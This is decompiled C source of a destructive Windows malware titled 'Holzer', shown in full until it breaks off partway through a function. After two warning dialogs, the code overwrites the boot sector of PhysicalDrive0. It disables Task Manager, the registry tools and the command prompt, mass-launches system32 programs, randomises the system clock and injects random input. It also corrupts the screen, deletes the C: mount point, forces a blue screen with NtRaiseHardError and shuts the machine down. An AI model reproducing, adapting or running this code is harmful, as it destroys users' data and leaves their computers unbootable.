int __cdecl main(int argc, const char **argv, const char **envp)
{
  HWND ConsoleWindow; // eax
  HANDLE FileA; // esi
  HKEY phkResult[2]; // [esp+Ch] [ebp-210h] BYREF
  BYTE Data[4]; // [esp+14h] [ebp-208h] BYREF
  char Buffer[512]; // [esp+18h] [ebp-204h] BYREF

  ConsoleWindow = GetConsoleWindow();
  ShowWindow(ConsoleWindow, 0);
  if ( MessageBoxA(
         0,
         "You are about to run a malware.\n"
         "\n"
         "Use this malware wisely, this will cause data loss and makes your computer likely unbootable.\n"
         "If you don't know what is this program do, just click 'No' to keep your computer safe.\n"
         "When clicking 'Yes', the malware will start and you'll understand the risk. If you want to\n"
         "try this, then use a secure environment, like a Virtual Machine.\n"
         "The creator is not responsible for any data loss or damage made to your computer.\n"
         "Execute this malware? You won't be able to use Windows again!\n"
         "\n"
         "WARNING: This malware contain flashing lights and disturbing noises.",
         "Holzer",
         0x34u) != 6
    || MessageBoxA(
         0,
         "FINAL WARNING!\n"
         "\n"
         "If you have read the previous warning, then you'll keep in mind that your\n"
         "computer going to be destroyed. Clicking 'Yes' destroys your computer!\n"
         "You won't be able to use Windows again!\n"
         "The creator is not responsible for any data loss or damage made to your computer.\n"
         "\n"
         "Do you still wanna execute this malware?",
         "Holzer",
         0x34u) != 6 )
  {
LABEL_5:
    ExitProcess(0);
  }
  qmemcpy(Buffer, &unk_4143D0, sizeof(Buffer));
  FileA = CreateFileA("\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0, 3u, 0, 0);
  if ( FileA == (HANDLE)-1 )
  {
    MessageBoxA(0, "Failed to open hard drive.", "Error", 0x10u);
    CloseHandle((HANDLE)0xFFFFFFFF);
    goto LABEL_5;
  }
  if ( !WriteFile(FileA, Buffer, 0x200u, (LPDWORD)&phkResult[1], 0) )
  {
    MessageBoxA(0, "Failed to overwrite bootloader.", "Error", 0x10u);
    CloseHandle(FileA);
    ExitProcess(0);
  }
  CloseHandle(FileA);
  *(_DWORD *)Data = 1;
  RegCreateKeyExW(
    HKEY_CURRENT_USER,
    L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
    0,
    0,
    0,
    0xF013Fu,
    0,
    phkResult,
    0);
  RegSetValueExW(phkResult[0], L"DisableTaskMgr", 0, 4u, Data, 4u);
  RegSetValueExW(phkResult[0], L"DisableRegistryTools", 0, 4u, Data, 4u);
  RegCreateKeyExW(
    HKEY_CURRENT_USER,
    L"SOFTWARE\\Policies\\Microsoft\\Windows\\System",
    0,
    0,
    0,
    0xF013Fu,
    0,
    phkResult,
    0);
  RegSetValueExW(phkResult[0], L"DisableCMD", 0, 4u, Data, 4u);
  RegCloseKey(phkResult[0]);
  sub_403610();
  return 0;
}

void sub_403610()
{
  unsigned __int64 v0; // rax
  unsigned int v1; // esi
  HANDLE v2; // edi
  unsigned __int64 v3; // rax
  unsigned int v4; // esi
  unsigned __int64 v5; // rax
  unsigned int v6; // esi
  HWND DesktopWindow; // eax
  unsigned __int64 v8; // rax
  unsigned int v9; // esi
  unsigned __int64 v10; // rax
  unsigned int v11; // esi
  unsigned __int64 v12; // rax
  unsigned int v13; // esi
  unsigned __int64 v14; // rax
  unsigned int v15; // esi
  unsigned __int64 v16; // rax
  unsigned int v17; // esi
  unsigned __int64 v18; // rax
  unsigned int v19; // esi
  unsigned __int64 v20; // rax
  unsigned int v21; // esi
  unsigned __int64 v22; // rax
  unsigned int v23; // esi
  unsigned __int64 v24; // rax
  unsigned int v25; // esi
  unsigned __int64 v26; // rax
  unsigned __int64 v27; // rax
  unsigned int v28; // esi
  HANDLE v29; // eax
  unsigned __int64 v30; // rax
  unsigned int v31; // esi
  HMODULE LibraryA; // eax
  FARPROC RtlAdjustPrivilege; // ebx
  HMODULE v34; // eax
  FARPROC NtRaiseHardError; // esi
  HANDLE CurrentProcess; // eax
  HANDLE TokenHandle; // [esp+28h] [ebp-24h] BYREF
  DWORD ThreadId; // [esp+2Ch] [ebp-20h] BYREF
  char v39; // [esp+33h] [ebp-19h] BYREF
  char v40[4]; // [esp+34h] [ebp-18h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+38h] [ebp-14h] BYREF

  v0 = __rdtsc();
  v1 = ((((_DWORD)v0 << 13) ^ (unsigned int)v0) << 17) ^ ((_DWORD)v0 << 13) ^ v0;
  Sleep(((32 * v1) ^ v1) % 0x1388 + 3400);
  v2 = CreateThread(0, 0, StartAddress, 0, 0, &ThreadId);
  v3 = __rdtsc();
  v4 = ((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ v3;
  Sleep(((32 * v4) ^ v4) % 0x12C0 + 3900);
  CreateThread(0, 0, sub_401830, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_401A30, 0, 0, &ThreadId);
  sub_4011C0();
  v5 = __rdtsc();
  v6 = ((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ v5;
  Sleep(((32 * v6) ^ v6) % 0x3A98 + 11000);
  CreateThread(0, 0, sub_401BF0, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_401C80, 0, 0, &ThreadId);
  DesktopWindow = GetDesktopWindow();
  EnableWindow(DesktopWindow, 0);
  v8 = __rdtsc();
  v9 = ((((_DWORD)v8 << 13) ^ (unsigned int)v8) << 17) ^ ((_DWORD)v8 << 13) ^ v8;
  Sleep(((32 * v9) ^ v9) % 0x2EE0 + 10000);
  CreateThread(0, 0, sub_401CE0, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_401D80, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_401E10, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_402600, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_4028C0, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_4029C0, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_402860, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_401E80, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_402130, 0, 0, &ThreadId);
  waveOutReset(hwo);
  hwo = 0;
  sub_4012F0();
  TerminateThread(v2, 0);
  CloseHandle(v2);
  v10 = __rdtsc();
  v11 = ((((_DWORD)v10 << 13) ^ (unsigned int)v10) << 17) ^ ((_DWORD)v10 << 13) ^ v10;
  Sleep(((32 * v11) ^ v11) % 0x36B0 + 13000);
  CreateThread(0, 0, sub_402450, 0, 0, &ThreadId);
  v12 = __rdtsc();
  v13 = ((((_DWORD)v12 << 13) ^ (unsigned int)v12) << 17) ^ ((_DWORD)v12 << 13) ^ v12;
  Sleep(((32 * v13) ^ v13) % 0x2710 + 9000);
  CreateThread(0, 0, sub_4024F0, 0, 0, &ThreadId);
  v14 = __rdtsc();
  v15 = ((((_DWORD)v14 << 13) ^ (unsigned int)v14) << 17) ^ ((_DWORD)v14 << 13) ^ v14;
  Sleep(((32 * v15) ^ v15) % 0x1F40 + 7000);
  CreateThread(0, 0, sub_402B90, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_402BC0, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_402AF0, 0, 0, &ThreadId);
  waveOutReset(hwo);
  hwo = 0;
  sub_401420();
  v16 = __rdtsc();
  v17 = ((((_DWORD)v16 << 13) ^ (unsigned int)v16) << 17) ^ ((_DWORD)v16 << 13) ^ v16;
  Sleep(((32 * v17) ^ v17) % 0x2710 + 9000);
  CreateThread(0, 0, sub_402590, 0, 0, &ThreadId);
  v18 = __rdtsc();
  v19 = ((((_DWORD)v18 << 13) ^ (unsigned int)v18) << 17) ^ ((_DWORD)v18 << 13) ^ v18;
  Sleep(((32 * v19) ^ v19) % 0x1194 + 3200);
  CreateThread(0, 0, sub_4034C0, 0, 0, &ThreadId);
  v20 = __rdtsc();
  v21 = ((((_DWORD)v20 << 13) ^ (unsigned int)v20) << 17) ^ ((_DWORD)v20 << 13) ^ v20;
  Sleep(((32 * v21) ^ v21) % 0x5DC0 + 21000);
  CreateThread(0, 0, sub_402D40, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_402E60, 0, 0, &ThreadId);
  v22 = __rdtsc();
  v23 = ((((_DWORD)v22 << 13) ^ (unsigned int)v22) << 17) ^ ((_DWORD)v22 << 13) ^ v22;
  Sleep(((32 * v23) ^ v23) % 0xFA0 + 2700);
  CreateThread(0, 0, sub_4030A0, 0, 0, &ThreadId);
  v24 = __rdtsc();
  v25 = ((((_DWORD)v24 << 13) ^ (unsigned int)v24) << 17) ^ ((_DWORD)v24 << 13) ^ v24;
  Sleep(((32 * v25) ^ v25) % 0x1D4C + 6400);
  CreateThread(0, 0, sub_402F00, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_402FF0, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_403110, 0, 0, &ThreadId);
  waveOutReset(hwo);
  hwo = 0;
  sub_401550();
  v26 = __rdtsc();
  Sleep(
    ((32 * (((((_DWORD)v26 << 13) ^ (unsigned int)v26) << 17) ^ ((_DWORD)v26 << 13) ^ (unsigned int)v26)) ^ ((((_DWORD)v26 << 13) ^ (unsigned int)v26) << 17) ^ ((_DWORD)v26 << 13) ^ (unsigned int)v26)
  % 0x4E20
  + 18000);
  CreateThread(0, 0, sub_4032C0, 0, 0, &ThreadId);
  CreateThread(0, 0, sub_403370, 0, 0, &ThreadId);
  waveOutReset(hwo);
  hwo = 0;
  sub_401690();
  v27 = __rdtsc();
  v28 = ((((_DWORD)v27 << 13) ^ (unsigned int)v27) << 17) ^ ((_DWORD)v27 << 13) ^ v27;
  Sleep(((32 * v28) ^ v28) % 0x4268 + 16000);
  v29 = CreateThread(0, 0, sub_4035D0, 0, 0, &ThreadId);
  CloseHandle(v29);
  v30 = __rdtsc();
  v31 = ((((_DWORD)v30 << 13) ^ (unsigned int)v30) << 17) ^ ((_DWORD)v30 << 13) ^ v30;
  Sleep(((32 * v31) ^ v31) % 0xFA0 + 3000);
  DeleteVolumeMountPointA("C:\\");
  LibraryA = LoadLibraryA("ntdll.dll");
  RtlAdjustPrivilege = GetProcAddress(LibraryA, "RtlAdjustPrivilege");
  v34 = LoadLibraryA("ntdll.dll");
  NtRaiseHardError = GetProcAddress(v34, "NtRaiseHardError");
  ((void (__stdcall *)(int, int, _DWORD, char *))RtlAdjustPrivilege)(19, 1, 0, &v39);
  ((void (__stdcall *)(int, _DWORD, _DWORD, _DWORD, int, char *))NtRaiseHardError)(-1073740768, 0, 0, 0, 6, v40);
  CurrentProcess = GetCurrentProcess();
  OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle);
  LookupPrivilegeValueW(0, L"SeShutdownPrivilege", &NewState.Privileges[0].Luid);
  NewState.PrivilegeCount = 1;
  NewState.Privileges[0].Attributes = 2;
  AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
  ExitWindowsEx(6u, 0x10011u);
  Sleep(0xFFFFFFFF); // = 4294967295?
}

void __stdcall __noreturn sub_401830(LPVOID lpThreadParameter)
{
  int SystemMetrics; // edi
  unsigned __int64 v2; // rax
  int v3; // esi
  int v4; // eax
  unsigned __int64 v5; // rax
  int v6; // edi
  unsigned __int64 v7; // rax
  int v8; // edi
  int i; // esi
  unsigned __int64 v10; // rax
  int v11; // edi
  unsigned __int64 v12; // rax
  int v13; // edi
  int v14; // esi
  int v15; // eax
  HDC hDC; // [esp+Ch] [ebp-24h]
  int v17; // [esp+10h] [ebp-20h]
  int v18; // [esp+14h] [ebp-1Ch]
  struct tagCURSORINFO pci; // [esp+18h] [ebp-18h] BYREF

  SystemMetrics = GetSystemMetrics(0);
  v18 = SystemMetrics;
  v17 = GetSystemMetrics(1);
  hDC = GetDC(0);
  while ( 1 )
  {
    v2 = __rdtsc();
    v3 = 0;
    v4 = v2 & 3;
    if ( v4 )
    {
      if ( v4 == 1 )
      {
        v7 = __rdtsc();
        v8 = (((((_DWORD)v7 << 13) ^ (unsigned int)v7) << 17) ^ ((_DWORD)v7 << 13) ^ (unsigned int)v7 ^ (unsigned __int64)(32 * (((((_DWORD)v7 << 13) ^ (unsigned int)v7) << 17) ^ ((_DWORD)v7 << 13) ^ (unsigned int)v7)))
           % (unsigned int)SystemMetrics;
        for ( i = GetSystemMetrics(1); i > 0; i -= 2 )
        {
          pci.cbSize = 20;
          GetCursorInfo(&pci);
          DrawIcon(hDC, v8, i, pci.hCursor);
          v8 += 2;
          Sleep(1u);
          if ( v8 >= v18 )
            break;
        }
      }
      else if ( v4 == 2 )
      {
        v10 = __rdtsc();
        v11 = (((((_DWORD)v10 << 13) ^ (unsigned int)v10) << 17) ^ ((_DWORD)v10 << 13) ^ (unsigned int)v10 ^ (unsigned __int64)(32 * (((((_DWORD)v10 << 13) ^ (unsigned int)v10) << 17) ^ ((_DWORD)v10 << 13) ^ (unsigned int)v10)))
            % (unsigned int)SystemMetrics;
        if ( v17 > 0 )
        {
          do
          {
            pci.cbSize = 20;
            GetCursorInfo(&pci);
            DrawIcon(hDC, v11, v3, pci.hCursor);
            v11 -= 2;
            if ( v11 <= 0 )
              v3 = v17;
            Sleep(1u);
            v3 += 2;
          }
          while ( v3 < v17 );
        }
      }
      else
      {
        v12 = __rdtsc();
        v13 = (((((_DWORD)v12 << 13) ^ (unsigned int)v12) << 17) ^ ((_DWORD)v12 << 13) ^ (unsigned int)v12 ^ (unsigned __int64)(32 * (((((_DWORD)v12 << 13) ^ (unsigned int)v12) << 17) ^ ((_DWORD)v12 << 13) ^ (unsigned int)v12)))
            % (unsigned int)SystemMetrics;
        v14 = GetSystemMetrics(1);
        if ( v14 > 0 )
        {
          do
          {
            pci.cbSize = 20;
            GetCursorInfo(&pci);
            DrawIcon(hDC, v13, v14, pci.hCursor);
            v13 -= 2;
            Sleep(1u);
            v15 = 0;
            if ( v13 > 0 )
              v15 = v14;
            v14 = v15 - 2;
          }
          while ( v15 - 2 > 0 );
        }
      }
    }
    else
    {
      v5 = __rdtsc();
      v6 = (((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ (unsigned int)v5 ^ (unsigned __int64)(32 * (((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ (unsigned int)v5)))
         % (unsigned int)SystemMetrics;
      if ( v17 > 0 )
      {
        do
        {
          pci.cbSize = 20;
          GetCursorInfo(&pci);
          DrawIcon(hDC, v6, v3, pci.hCursor);
          v6 += 2;
          if ( v6 >= v18 )
            v3 = v17;
          Sleep(1u);
          v3 += 2;
        }
        while ( v3 < v17 );
      }
    }
    SystemMetrics = v18;
  }
}

void __stdcall __noreturn sub_401A30(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  unsigned int v2; // esi
  unsigned __int64 v3; // rax
  unsigned int v4; // esi
  unsigned __int64 v5; // rax
  unsigned int v6; // esi
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax
  unsigned int v10; // esi
  unsigned __int64 v11; // rax
  unsigned int v12; // esi
  unsigned __int64 v13; // rax
  unsigned int v14; // esi
  unsigned __int64 v15; // rax
  unsigned int v16; // esi
  SYSTEMTIME SystemTime; // [esp+Ch] [ebp-18h] BYREF

  while ( 1 )
  {
    v1 = __rdtsc();
    v2 = ((((_DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((_DWORD)v1 << 13) ^ v1;
    SystemTime.wYear = ((32 * v2) ^ v2) % 0x8FC + 1900;
    v3 = __rdtsc();
    v4 = ((((_DWORD)v3 << 13) ^ (unsigned int)v3) << 17) ^ ((_DWORD)v3 << 13) ^ v3;
    SystemTime.wMonth = ((32 * v4) ^ v4) % 0xC + 1;
    v5 = __rdtsc();
    v6 = ((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ v5;
    SystemTime.wDay = ((32 * v6) ^ v6) % 0x1C + 1;
    v7 = __rdtsc();
    v8 = ((((_DWORD)v7 << 13) ^ (unsigned int)v7) << 17) ^ ((_DWORD)v7 << 13) ^ v7;
    v9 = __rdtsc();
    SystemTime.wHour = ((32 * v8) ^ v8) % 0x3B + 1;
    v10 = ((((_DWORD)v9 << 13) ^ (unsigned int)v9) << 17) ^ ((_DWORD)v9 << 13) ^ v9;
    SystemTime.wMinute = ((32 * v10) ^ v10) % 0x3B + 1;
    v11 = __rdtsc();
    v12 = ((((_DWORD)v11 << 13) ^ (unsigned int)v11) << 17) ^ ((_DWORD)v11 << 13) ^ v11;
    SystemTime.wSecond = ((32 * v12) ^ v12) % 0x3B + 1;
    v13 = __rdtsc();
    v14 = ((((_DWORD)v13 << 13) ^ (unsigned int)v13) << 17) ^ ((_DWORD)v13 << 13) ^ v13;
    SystemTime.wMilliseconds = ((32 * v14) ^ v14) % 0x3B + 1;
    SetSystemTime(&SystemTime);
    v15 = __rdtsc();
    v16 = ((((_DWORD)v15 << 13) ^ (unsigned int)v15) << 17) ^ ((_DWORD)v15 << 13) ^ v15;
    SystemTime = 0i64;
    Sleep(((32 * v16) ^ v16) % 0x7D0 + 700);
  }
}

void __stdcall __noreturn sub_401BF0(LPVOID lpThreadParameter)
{
  HANDLE FirstFileW; // esi
  struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-258h] BYREF

  while ( 1 )
  {
    do
    {
      FirstFileW = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.exe", &FindFileData);
      ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
    }
    while ( !FindNextFileW(FirstFileW, &FindFileData) );
    do
    {
      ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
      Sleep(0xFAu);
    }
    while ( FindNextFileW(FirstFileW, &FindFileData) );
  }
}

void __stdcall __noreturn sub_401C80(LPVOID lpThreadParameter)
{
  HWND ForegroundWindow; // esi
  HMENU SystemMenu; // eax
  LONG WindowLongA; // eax
  LONG v4; // eax

  while ( 1 )
  {
    ForegroundWindow = GetForegroundWindow();
    SystemMenu = GetSystemMenu(ForegroundWindow, 0);
    EnableMenuItem(SystemMenu, 0xF060u, 3u);
    WindowLongA = GetWindowLongA(ForegroundWindow, -16);
    SetWindowLongA(ForegroundWindow, -16, WindowLongA & 0xFFFDFFFF);
    v4 = GetWindowLongA(ForegroundWindow, -16);
    SetWindowLongA(ForegroundWindow, -16, v4 & 0xFFFEFFFF);
    Sleep(0xAu);
  }
}

void __stdcall __noreturn sub_401CE0(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  unsigned __int64 v2; // rax
  unsigned int v3; // esi
  struct tagINPUT pInputs; // [esp+Ch] [ebp-20h] BYREF

  pInputs.type = 1;
  while ( 1 )
  {
    v1 = __rdtsc();
    pInputs.ki.wVk = VkKeyScanA(
                       (((((_DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((_DWORD)v1 << 13) ^ (unsigned int)v1 ^ (unsigned __int64)(32 * (((((_DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((_DWORD)v1 << 13) ^ (unsigned int)v1)))
                     % 0x12);
    SendInput(1u, &pInputs, 28);
    v2 = __rdtsc();
    v3 = ((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ v2;
    memset(&pInputs, 0, sizeof(pInputs));
    Sleep(((32 * v3) ^ v3) % 0x32 + 30);
  }
}

void __stdcall __noreturn sub_401D80(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  bool v2; // zf
  DWORD v3; // eax
  unsigned __int64 v4; // rax
  unsigned int v5; // esi
  struct tagINPUT pInputs; // [esp+Ch] [ebp-20h] BYREF

  pInputs.type = 0;
  while ( 1 )
  {
    v1 = __rdtsc();
    v2 = (v1 & 1) == 0;
    v3 = 16;
    if ( !v2 )
      v3 = 2;
    pInputs.mi.dwFlags = v3;
    SendInput(1u, &pInputs, 28);
    v4 = __rdtsc();
    v5 = ((((_DWORD)v4 << 13) ^ (unsigned int)v4) << 17) ^ ((_DWORD)v4 << 13) ^ v4;
    memset(&pInputs, 0, sizeof(pInputs));
    Sleep(((32 * v5) ^ v5) % 0x46 + 50);
  }
}

void __stdcall __noreturn sub_401E10(LPVOID lpThreadParameter)
{
  int i; // ecx
  unsigned __int64 v2; // rax
  HWND ForegroundWindow; // eax
  CHAR String; // [esp+Fh] [ebp-5h] BYREF

  while ( 1 )
  {
    for ( i = 0; i < 70; ++i )
    {
      v2 = __rdtsc();
      *(&String + i) = (((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ (unsigned int)v2 ^ (unsigned __int64)(32 * (((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ (unsigned int)v2)))
                     % 0x47;
    }
    ForegroundWindow = GetForegroundWindow();
    SetWindowTextA(ForegroundWindow, &String);
    Sleep(0x3E8u);
  }
}

void __stdcall __noreturn sub_402600(LPVOID lpThreadParameter)
{
  HDC DC; // edi
  unsigned __int64 v2; // rax
  int v3; // ebx
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // rax
  unsigned int v7; // esi
  unsigned __int64 v8; // rax
  int v9; // esi
  signed int v10; // edx
  int v11; // ecx
  bool v12; // zf
  signed int v13; // ecx
  int v14; // eax
  int v15; // edx
  signed int v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // [esp+Ch] [ebp-18h]
  int SystemMetrics; // [esp+10h] [ebp-14h]
  int v21; // [esp+14h] [ebp-10h]
  int v22; // [esp+14h] [ebp-10h]
  signed int v23; // [esp+14h] [ebp-10h]
  unsigned int v24; // [esp+14h] [ebp-10h]
  unsigned int v25; // [esp+18h] [ebp-Ch]
  signed int v26; // [esp+18h] [ebp-Ch]
  int v27; // [esp+18h] [ebp-Ch]
  signed int v28; // [esp+1Ch] [ebp-8h]
  int v29; // [esp+1Ch] [ebp-8h]
  int v30; // [esp+1Ch] [ebp-8h]
  int y1; // [esp+20h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v19 = GetSystemMetrics(1);
  DC = GetDC(0);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v2 = __rdtsc();
        v3 = (((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ (unsigned int)v2 ^ (unsigned __int64)(32 * (((((_DWORD)v2 << 13) ^ (unsigned int)v2) << 17) ^ ((_DWORD)v2 << 13) ^ (unsigned int)v2)))
           % (unsigned int)SystemMetrics;
        v4 = __rdtsc();
        y1 = (((((_DWORD)v4 << 13) ^ (unsigned int)v4) << 17) ^ ((_DWORD)v4 << 13) ^ (unsigned int)v4 ^ (unsigned __int64)(32 * (((((_DWORD)v4 << 13) ^ (unsigned int)v4) << 17) ^ ((_DWORD)v4 << 13) ^ (unsigned int)v4)))
           % (unsigned int)v19;
        v5 = __rdtsc();
        v21 = v5 & 3;
        v6 = __rdtsc();
        v7 = ((32 * (((((_DWORD)v6 << 13) ^ (unsigned int)v6) << 17) ^ ((_DWORD)v6 << 13) ^ (unsigned int)v6)) ^ ((((_DWORD)v6 << 13) ^ (unsigned int)v6) << 17) ^ ((_DWORD)v6 << 13) ^ (unsigned int)v6)
           % 0x12C;
        v8 = __rdtsc();
        v9 = v7 + 200;
        HIDWORD(v8) = ((((_DWORD)v8 << 13) ^ (unsigned int)v8) << 17) ^ ((_DWORD)v8 << 13) ^ v8;
        v10 = ((unsigned int)(32 * HIDWORD(v8)) ^ HIDWORD(v8)) % 0x32 + 20;
        v28 = v10;
        if ( v21 )
          break;
        if ( v10 > 0 )
        {
          v29 = v3;
          v11 = v3;
          v25 = (v10 - 1) / 0xAu + 1;
          do
          {
            BitBlt(DC, v11, v11 + y1 - v3, v9, v9, DC, v3, y1, 0xCC0020u);
            Sleep(0x64u);
            v11 = v29 + 10;
            v12 = v25-- == 1;
            v29 += 10;
          }
          while ( !v12 );
        }
      }
      if ( v21 != 1 )
        break;
      v13 = 0;
      v26 = 0;
      if ( v10 > 0 )
      {
        v14 = y1;
        v15 = y1;
        v22 = y1;
        do
        {
          BitBlt(DC, v13 + v3, v15, v9, v9, DC, v3, v14, 0xCC0020u);
          Sleep(0x64u);
          v13 = v26 + 10;
          v14 = y1;
          v15 = v22 - 10;
          v26 = v13;
          v22 -= 10;
        }
        while ( v13 < v28 );
      }
    }
    if ( v21 == 2 )
    {
      v16 = 0;
      v23 = 0;
      if ( v10 > 0 )
      {
        v17 = v3;
        v27 = v3;
        do
        {
          BitBlt(DC, v17, v16 + y1, v9, v9, DC, v3, y1, 0xCC0020u);
          Sleep(0x64u);
          v16 = v23 + 10;
          v17 = v27 - 10;
          v23 = v16;
          v27 -= 10;
        }
        while ( v16 < v28 );
      }
    }
    else if ( v10 > 0 )
    {
      v30 = v3;
      v18 = v3;
      v24 = (v10 - 1) / 0xAu + 1;
      do
      {
        BitBlt(DC, v18, v18 + y1 - v3, v9, v9, DC, v3, y1, 0xCC0020u);
        Sleep(0x64u);
        v18 = v30 - 10;
        v12 = v24-- == 1;
        v30 -= 10;
      }
      while ( !v12 );
    }
  }
}

void __stdcall __noreturn sub_4028C0(LPVOID lpThreadParameter)
{
  unsigned __int64 v1; // rax
  unsigned __int64 v2; // rax
  int v3; // ebx
  unsigned __int64 v4; // rax
  int v5; // edi
  unsigned __int64 v6; // rax
  int v7; // ebx
  int v8; // edi
  unsigned int v9; // esi
  HWND ForegroundWindow; // eax
  unsigned __int64 v11; // rax
  unsigned int v12; // esi
  int SystemMetrics; // [esp+Ch] [ebp-Ch]
  unsigned int v14; // [esp+10h] [ebp-8h]
  int v15; // [esp+14h] [ebp-4h]

  SystemMetrics = GetSystemMetrics(0);
  v15 = GetSystemMetrics(1);
  GetDC(0);
  while ( 1 )
  {
    v1 = __rdtsc();
    v14 = ((((_DWORD)v1 << 13) ^ (unsigned int)v1) << 17) ^ ((_DWORD)v1 << 13) ^ v1;
    v2 = __rdtsc();
    v3 = v2;
    v4 = __rdtsc();
    v5 = v4;
    v6 = __rdtsc();
    v7 = (((v3 << 13) ^ v3) << 17) ^ (v3 << 13) ^ v3;
    v8 = (((v5 << 13) ^ v5) << 17) ^ (v5 << 13) ^ v5;
    v9 = ((((_DWORD)v6 << 13) ^ (unsigned int)v6) << 17) ^ ((_DWORD)v6 << 13) ^ v6;
    ForegroundWindow = GetForegroundWindow();
    SetWindowPos(
      ForegroundWindow,
      0,
      (v9 ^ (unsigned __int64)(32 * v9)) % (unsigned int)SystemMetrics,
      ((unsigned int)v8 ^ (unsigned __int64)(unsigned int)(32 * v8)) % (unsigned int)v15,
      ((unsigned int)v7 ^ (unsigned __int64)(unsigned int)(32 * v7)) % (unsigned int)SystemMetrics,
      (v14 ^ (unsigned __int64)(32 * v14)) % (unsigned int)v15,
      0);
    v11 = __rdtsc();
    v12 = ((((_DWORD)v11 << 13) ^ (unsigned int)v11) << 17) ^ ((_DWORD)v11 << 13) ^ v11;
    Sleep(((32 * v12) ^ v12) % 0x320 + 600);
  }
}

void __stdcall __noreturn sub_4029C0(LPVOID lpThreadParameter)
{
  int left; // edi
  int top; // esi
  unsigned __int64 v3; // rax
  int v4; // ebx
  unsigned __int64 v5; // rax
  int v6; // ecx
  int v7; // edx
  int v8; // eax
  bool v9; // zf
  int v10; // [esp-10h] [ebp-54h]
  int v11; // [esp-Ch] [ebp-50h]
  int v12; // [esp-8h] [ebp-4Ch]
  int v13; // [esp+Ch] [ebp-38h]
  int SystemMetrics; // [esp+10h] [ebp-34h]
  unsigned int v15; // [esp+14h] [ebp-30h]
  unsigned int v16; // [esp+14h] [ebp-30h]
  int Y; // [esp+18h] [ebp-2Ch]
  HWND hWnd; // [esp+1Ch] [ebp-28h]
  int v19; // [esp+20h] [ebp-24h]
  int v20; // [esp+24h] [ebp-20h]
  int v21; // [esp+28h] [ebp-1Ch]
  struct tagRECT Rect; // [esp+2Ch] [ebp-18h] BYREF

  SystemMetrics = GetSystemMetrics(0);
  v13 = GetSystemMetrics(1);
LABEL_2:
  while ( 1 )
  {
    hWnd = GetForegroundWindow();
    GetWindowRect(hWnd, &Rect);
    left = Rect.left;
    top = Rect.top;
    v3 = __rdtsc();
    v4 = v3 & 3;
    if ( left >= SystemMetrics )
      break;
    if ( Rect.top >= v13 )
      goto LABEL_6;
    if ( Rect.left <= 0 )
      break;
    if ( Rect.top <= 0 )
    {
LABEL_6:
      top = 0;
      Rect.top = 0;
    }
LABEL_8:
    v5 = __rdtsc();
    HIDWORD(v5) = ((((_DWORD)v5 << 13) ^ (unsigned int)v5) << 17) ^ ((_DWORD)v5 << 13) ^ v5;
    v15 = (32 * HIDWORD(v5)) ^ HIDWORD(v5);
    if ( (int)(v15 % 0x64 + 60) > 0 )
    {
      Y = top;
      v6 = top;
      v21 = top;
      v7 = left;
      v19 = left;
      v16 = (v15 % 0x64 + 59) / 0x14 + 1;
      v8 = left;
      v20 = left;
      while ( v4 )
      {
        switch ( v4 )
        {
          case 1:
            v12 = top;
            v11 = left;
            v10 = v6;
            goto LABEL_18;
          case 2:
            SetWindowPos(hWnd, 0, v8, Y, left, top, 0);
            goto LABEL_19;
          case 3:
            v12 = top;
            v11 = left;
            v10 = Y;
LABEL_18:
            SetWindowPos(hWnd, 0, v7, v10, v11, v12, 0);
LABEL_19:
            Sleep(0xAu);
            v7 = v19;
            v6 = v21;
            v8 = v20;
            break;
        }
        Y -= 20;
        v6 += 20;
        v8 += 20;
        v21 = v6;
        v7 -= 20;
        v20 = v8;
        v9 = v16-- == 1;
        v19 = v7;
        if ( v9 )
          goto LABEL_2;
      }
      SetWindowPos(hWnd, 0, v8, v6, left, top, 0);
